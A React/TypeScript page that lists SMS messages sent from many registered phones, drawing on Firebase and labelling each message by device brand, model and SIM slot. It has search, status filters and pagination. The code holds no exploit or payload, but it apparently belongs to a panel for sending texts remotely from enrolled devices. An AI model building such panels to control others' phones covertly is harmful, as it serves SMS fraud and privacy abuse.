import { useState, useMemo, useRef } from "react";
import { useAllDevicesSentSMS, useFirebaseUsers } from "@/hooks/useFirebaseData";
import { Search, Loader2, Send, ArrowLeft, ArrowRight, Phone, CheckCircle, XCircle, Copy, X } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { format } from "date-fns";
import { toast } from "sonner";
import { useBgImageUrl } from "@/hooks/useCustomization";
import defaultBg from "@/assets/blackhole-bg.jpg";

const PAGE_SIZE = 20;

const AllSentSmsPage = () => {
  const navigate = useNavigate();
  const { allSent, loading } = useAllDevicesSentSMS();
  const { users } = useFirebaseUsers();
  const [search, setSearch] = useState("");
  const [page, setPage] = useState(1);
  const [filterStatus, setFilterStatus] = useState<"all" | "success" | "failed">("all");
  const topRef = useRef<HTMLDivElement>(null);
  const bgImage = useBgImageUrl() || defaultBg;

  const filtered = useMemo(() => {
    let list = allSent;
    if (filterStatus === "success") list = list.filter((s) => s.success);
    if (filterStatus === "failed") list = list.filter((s) => !s.success);
    if (search.trim()) {
      const q = search.toLowerCase();
      list = list.filter(
        (s) =>
          s.number.toLowerCase().includes(q) ||
          s.message.toLowerCase().includes(q) ||
          s.deviceId.toLowerCase().includes(q) ||
          (users[s.deviceId]?.model || "").toLowerCase().includes(q)
      );
    }
    return list;
  }, [allSent, search, filterStatus, users]);

  const totalPages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE));
  const paginated = filtered.slice((page - 1) * PAGE_SIZE, page * PAGE_SIZE);

  const successCount = allSent.filter((s) => s.success).length;
  const failedCount = allSent.length - successCount;

  const getDeviceLabel = (deviceId: string) => {
    const u = users[deviceId];
    return u ? `${u.brand} ${u.model}` : deviceId.slice(0, 8);
  };

  return (
    <div className="min-h-screen pb-28 lg:pb-8 relative">
      <div className="fixed inset-0 z-0 bg-cover bg-center opacity-15 pointer-events-none" style={{ backgroundImage: `url(${bgImage})` }} />
      <div className="relative z-10">
      <div ref={topRef} className="sticky top-0 z-30 bg-background/80 backdrop-blur-xl border-b border-border px-4 pt-5 pb-3">
        <div className="flex items-center justify-between mb-3">
          <h1 className="text-xl font-extrabold text-foreground">All Sent SMS</h1>
          <button
            onClick={() => navigate(-1)}
            className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/20 hover:text-destructive transition-colors"
          >
            <X className="h-4 w-4" />
          </button>
        </div>

        {/* Stats */}
        <div className="flex gap-2 mb-3">
          <div className="flex-1 rounded-xl bg-card border border-border p-2.5 text-center">
            <p className="text-lg font-bold text-foreground">{allSent.length}</p>
            <p className="text-[9px] text-muted-foreground">Total</p>
          </div>
          <div className="flex-1 rounded-xl bg-green/10 border border-green/20 p-2.5 text-center">
            <p className="text-lg font-bold text-green">{successCount}</p>
            <p className="text-[9px] text-green/70">Sent</p>
          </div>
          <div className="flex-1 rounded-xl bg-destructive/10 border border-destructive/20 p-2.5 text-center">
            <p className="text-lg font-bold text-destructive">{failedCount}</p>
            <p className="text-[9px] text-destructive/70">Failed</p>
          </div>
        </div>

        {/* Search */}
        <div className="relative mb-2">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <input
            className="w-full pl-9 pr-4 py-2.5 rounded-xl bg-secondary border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/30"
            placeholder="Search by number, message, device..."
            value={search}
            onChange={(e) => { setSearch(e.target.value); setPage(1); }}
          />
        </div>

        {/* Filters */}
        <div className="flex gap-1.5">
          {(["all", "success", "failed"] as const).map((f) => (
            <button
              key={f}
              onClick={() => { setFilterStatus(f); setPage(1); }}
              className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold transition-all ${
                filterStatus === f
                  ? "gradient-purple-pink text-primary-foreground"
                  : "bg-secondary text-muted-foreground hover:text-foreground"
              }`}
            >
              {f === "all" ? "All" : f === "success" ? "✓ Sent" : "✗ Failed"}
            </button>
          ))}
        </div>
      </div>

      {/* Content */}
      <div className="px-4 pt-3 space-y-2.5">
        {loading ? (
          <div className="flex flex-col items-center justify-center py-20 gap-3">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
            <p className="text-sm text-muted-foreground">Loading sent messages...</p>
          </div>
        ) : paginated.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 gap-3">
            <Send className="h-8 w-8 text-muted-foreground" />
            <p className="text-sm text-muted-foreground">No sent messages found</p>
          </div>
        ) : (
          paginated.map((s) => (
            <div key={s.key} className="rounded-2xl border border-border bg-card p-3.5 hover:border-primary/20 transition-all">
              <div className="flex items-center justify-between mb-1.5">
                <div className="flex items-center gap-1.5">
                  <div className="h-7 w-7 rounded-lg bg-cyan/10 flex items-center justify-center">
                    <Phone className="h-3.5 w-3.5 text-cyan" />
                  </div>
                  <span className="text-[11px] font-bold text-foreground font-mono">{s.number}</span>
                </div>
                <span
                  className={`inline-flex items-center gap-0.5 text-[9px] px-2 py-1 rounded-lg font-semibold ${
                    s.success ? "bg-green/10 text-green" : "bg-destructive/10 text-destructive"
                  }`}
                >
                  {s.success ? <CheckCircle className="h-3 w-3" /> : <XCircle className="h-3 w-3" />}
                  {s.status}
                </span>
              </div>

              <p className="text-[11px] text-foreground/85 leading-relaxed mb-1.5">{s.message}</p>

              <div className="flex items-center justify-between text-[9px]">
                <div className="flex items-center gap-1.5">
                  <span className="px-1.5 py-0.5 rounded-md bg-primary/10 text-primary font-semibold">
                    {getDeviceLabel(s.deviceId)}
                  </span>
                  <span className="px-1.5 py-0.5 rounded-md bg-cyan/10 text-cyan font-mono font-semibold">SIM {s.sim === "0" || s.sim === "1" ? Number(s.sim) + 1 : s.sim || "?"}</span>
                  {s.error && <span className="text-destructive truncate max-w-[120px]">{s.error}</span>}
                </div>
                <div className="flex items-center gap-1.5">
                  <button
                    onClick={() => { navigator.clipboard.writeText(s.message); toast.success("Copied"); }}
                    className="p-1 rounded hover:bg-secondary"
                  >
                    <Copy className="h-3 w-3 text-muted-foreground" />
                  </button>
                  <span className="text-muted-foreground">{format(new Date(s.time), "MMM dd, HH:mm")}</span>
                </div>
              </div>
            </div>
          ))
        )}

        {/* Pagination */}
        {totalPages > 1 && (
          <div className="flex items-center justify-center gap-3 py-4">
            <button
              disabled={page <= 1}
              onClick={() => { setPage((p) => p - 1); topRef.current?.scrollIntoView({ behavior: "smooth" }); }}
              className="h-9 w-9 rounded-xl bg-secondary flex items-center justify-center disabled:opacity-30"
            >
              <ArrowLeft className="h-4 w-4" />
            </button>
            <span className="text-xs font-semibold text-muted-foreground">
              {page} / {totalPages}
            </span>
            <button
              disabled={page >= totalPages}
              onClick={() => { setPage((p) => p + 1); topRef.current?.scrollIntoView({ behavior: "smooth" }); }}
              className="h-9 w-9 rounded-xl bg-secondary flex items-center justify-center disabled:opacity-30"
            >
              <ArrowRight className="h-4 w-4" />
            </button>
          </div>
        )}
      </div>
    </div>
    </div>
  );
};

export default AllSentSmsPage;
